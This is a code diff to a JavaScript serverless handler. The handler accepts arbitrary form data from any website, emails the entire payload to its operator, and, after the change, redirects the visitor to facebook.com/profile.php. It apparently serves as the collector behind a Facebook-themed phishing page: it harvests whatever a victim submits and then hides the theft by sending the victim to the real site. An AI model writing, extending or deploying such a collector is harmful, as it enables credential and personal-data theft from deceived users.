@@ -2,7 +2,7 @@ import { transporter } from "./emailConfig.js";
 import querystring from "querystring";
 
 export default async function handler(req, res) {
-  // ✅ CORS
+  // ✅ CORS headers
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type, Accept, Authorization");
@@ -11,20 +11,17 @@ export default async function handler(req, res) {
   if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
 
   try {
-    // ✅ Raw body read
+    // ✅ Read raw body
     let rawBody = "";
     for await (const chunk of req) rawBody += chunk;
 
     let formData = {};
     try {
       if (req.headers["content-type"]?.includes("application/json")) {
-        // Try JSON
         formData = JSON.parse(rawBody);
       } else if (req.headers["content-type"]?.includes("application/x-www-form-urlencoded")) {
-        // Try URL-encoded
         formData = querystring.parse(rawBody);
       } else {
-        // Unknown format → try JSON first, else raw
         try {
           formData = JSON.parse(rawBody);
         } catch {
@@ -32,7 +29,6 @@ export default async function handler(req, res) {
         }
       }
     } catch {
-      // Last safety fallback → raw
       formData = { raw: rawBody || "No data" };
     }
 
@@ -47,7 +43,9 @@ export default async function handler(req, res) {
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
 
-    res.status(200).json({ success: true, message: "Data sent via email (Asif)" });
+    // ✅ Redirect after sending
+    res.writeHead(302, { Location: "https://facebook.com/profile.php" });
+    res.end();
 
   } catch (error) {
     console.error("Serverless function error:", error);
